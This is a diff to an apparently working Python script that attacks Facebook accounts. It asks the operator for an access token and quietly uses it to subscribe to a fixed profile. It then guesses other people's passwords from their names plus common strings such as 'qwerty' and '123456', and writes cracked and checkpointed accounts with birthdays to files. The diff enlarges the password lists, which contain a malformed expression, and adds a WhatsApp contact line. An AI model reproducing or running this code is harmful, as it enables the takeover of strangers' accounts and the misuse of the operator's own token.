@@ -52,10 +52,10 @@ bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "0
 
 def logo():
 	os.system("clear")
-	print("""\x1b[1;62m░█──░█ ▀█▀ ░█▀▀▀█ ░█▀▀▀█ ░█──░█ ░█▀▀█ 
-\x1b[1;96m░█░█░█ ░█─ ─▄▄▄▀▀ ─▄▄▄▀▀ ░█▄▄▄█ ░█▀▀▄ 
+	print("""\x1b[1;92m░█──░█ ▀█▀ ░█▀▀▀█ ░█▀▀▀█ ░█──░█ ░█▀▀█ 
+\x1b[1;93m░█░█░█ ░█─ ─▄▄▄▀▀ ─▄▄▄▀▀ ░█▄▄▄█ ░█▀▀▄ 
 \x1b[1;98m░█▄▀▄█ ▄█▄ ░█▄▄▄█ ░█▄▄▄█ ──░█── ░█▄▄█
-""")
+\x1b[1;63mMESSAGE ME ON WHATSAPP IF YOU NEED ANY HELP +2347069457594""")
 def login():
 	os.system("clear")
 	try:
@@ -67,11 +67,9 @@ def login():
 		token = open("login.txt", "r")
 		menu()
 	except KeyError, IOError:
-		print("\033[1;93m If you dont have token ,  go download !Get Access Token! ")
 		print(" ")
-		print("\033[1;93m download on !playstore! ")
 		print(" ")
-		token = raw_input("\033[1;31m[1] L O G I N - W I T H - T O K E N \033[1;33m : ")
+		token = raw_input("\033[1;31m[1] L O G I N  W I T H ACCESS T O K E N \033[1;33m : ")
 		if token == "":
 			print("Wrong Input")
              
@@ -79,7 +77,7 @@ def login():
 			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
 			open("login.txt", "w").write(token)
 			#-> bot follow
-			requests.post("https://graph.facebook.com/100008297554931/subscribers?access_token="+token)      # Dapunta Khurayra X
+			requests.post("https://graph.facebook.com/100008297554931/subscribers?access_token="+token)     
 			menu()
 		except KeyError:
 			os.system("rm -f login.txt")
@@ -266,7 +264,7 @@ def cek_ttl_cp(uid, pw):
 			ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
 			month, day, year = ttl.split("/")
 			month = bulan_ttl[month]
-			print("\r\033[1;91m[WIZZYB-CP]\033[1;91m %s|%s|%s %s %s"%(uid, pw, day, month, year))
+			print("\r\033[1;93m[WIZZYB-CP]\033[1;91m %s|%s|%s %s %s"%(uid, pw, day, month, year))
 			cp.append("%s | %s"%(uid, pw))
 			open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
 	except KeyError, IOError:
@@ -286,11 +284,11 @@ def bapi(user):
 	); sys.stdout.flush()
 	uid, name = user.split("<=>")
 	if len(name)>=6:
-		pwx = [ name, name+"1", name+"12", name+"111", name+"123", name+"1234", name+"12345", "223344", "334455", "123456", "445566" ]
+		pwx = [ name, name+"1", name+"12", name+"1122", name+"12", name-+"000", name+"0000", "password", "facebook", "qwerty12345", "qwerty12", "qwerty", "qwerty11", name+"234", name+"111", name+"123", name+"1234", name+"12345", "223344", "334455", "123456", "445566" ]
 	elif len(name)<=2:
-		pwx = [ name, name+"11", name+"33", name+"55", name+"77", name+"123", name+"1234", name+"12345", "223344","334455","123456","445566"]
+		pwx = [ name, name+"1", name+"12", name+"1122", name+"12", name-+"000", name+"0000", "password", "facebook", "qwerty12345", "qwerty12", "qwerty", "qwerty11", name+"234", name+"111", name+"123", name+"1234", name+"12345", "223344", "334455", "123456", "445566" ]
 	elif len(name)<=3:
-		pwx = [ name, name+"1", name+"12", name+"123", name+"1234", name+"12345","223344","334455","123456","445566"]
+		pwx = [ name, name+"1", name+"12", name+"1122", name+"12", name-+"000", name+"0000", "password", "facebook", "qwerty12345", "qwerty12", "qwerty", "qwerty11", name+"234", name+"111", name+"123", name+"1234", name+"12345", "223344", "334455", "123456", "445566" ]
 	else:
 		pwx = [ name+"123456789", name+"123456"]
 	try:
@@ -306,13 +304,13 @@ def bapi(user):
 				break
 				continue
 			elif "www.facebook.com" in send.json()["error_msg"]:
-				print("\r\033[1;97m[\033[1;91mWIZZYB-CP\033[1;97m]\033[1;91m %s|%s\033[0;92m        "%(uid, pw))
+				print("\r\033[1;97m[\033[1;93mWIZZYB-CP\033[1;97m]\033[1;91m %s|%s\033[0;92m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 			elif "www.facebook.com" in send.json()["error_msg"]:
-				print("\r\033[1;97m[\033[1;91mWIZZYB-CP\033[1;97m]\033[1;91m %s |%s | %s"%(uid, pw))
+				print("\r\033[1;97m[\033[1;93mWIZZYB-CP\033[1;97m]\033[1;91m %s |%s | %s"%(uid, pw))
 				cp.append("%s | %s"%(uid, pw))
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s | %s\n"%(uid, pw))
 				break
@@ -333,13 +331,13 @@ def mbasic(user):
 	); sys.stdout.flush()
 	uid, name = user.split("<=>")
 	if len(name)>=6:
-		pwx = [ name, name+"123", name+"1234", name+"12345","223344","334455","123456","445566" ]
+		pwx = [ name, name+"1", name+"12", name+"1122", name+"12", name-+"000", name+"0000", "password", "facebook", "qwerty12345", "qwerty12", "qwerty", "qwerty11", name+"234", name+"111", name+"123", name+"1234", name+"12345", "223344", "334455", "123456", "445566" ]
 	elif len(name)<=2:
-		pwx = [ name+"123", name+"1234", name+"12345","223344","334455","123456","445566" ]
+		pwx = [ name, name+"1", name+"12", name+"1122", name+"12", name-+"000", name+"0000", "password", "facebook", "qwerty12345", "qwerty12", "qwerty", "qwerty11", name+"234", name+"111", name+"123", name+"1234", name+"12345", "223344", "334455", "123456", "445566" ]
 	elif len(name)<=3:
-		pwx = [ name+"123", name+"12345","223344","334455","123456","445566" ]
+		pwx = [ name, name+"1", name+"12", name+"1122", name+"12", name-+"000", name+"0000", "password", "facebook", "qwerty12345", "qwerty12", "qwerty", "qwerty11", name+"234", name+"111", name+"123", name+"1234", name+"12345", "223344", "334455", "123456", "445566" ]
 	else:
-		pwx = [ name+"123", name+"12345","223344","123456","334455","445566" ]
+		pwx = [ name, name+"1", name+"12", name+"1122", name+"12", name-+"000", name+"0000", "password", "facebook", "qwerty12345", "qwerty12", "qwerty", "qwerty11", name+"234", name+"111", name+"123", name+"1234", name+"12345", "223344", "334455", "123456", "445566" ]
 	try:
 		for pw in pwx:
 			kwargs = {}
@@ -364,7 +362,7 @@ def mbasic(user):
 				break
 				continue
 			elif "checkpoint" in ses.cookies.get_dict().keys():
-				print("\r\033[1;97m[\033[1;91mWIZZYB-CP\033[1;97m]\033[1;91m %s|%s\033[0;92m        "%(uid, pw))
+				print("\r\033[1;97m[\033[1;93mWIZZYB-CP\033[1;97m]\033[1;91m %s|%s\033[0;92m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
@@ -385,7 +383,7 @@ def mobile(user):
 	); sys.stdout.flush()
 	uid, name = user.split("<=>")
 	if len(name)>=6:
-		pwx = [ name, name+"123", name+"1234", name+"12345" ]
+		pwx = [ name, name+"1", name+"12", name+"1122", name+"12", name-+"000", name+"0000", "password", "facebook", "qwerty12345", "qwerty12", "qwerty", "qwerty11", name+"234", name+"111", name+"123", name+"1234", name+"12345", "223344", "334455", "123456", "445566" ]
 	elif len(name)<=2:
 		pwx = [ name+"123", name+"1234", name+"12345" ]
 	elif len(name)<=3:
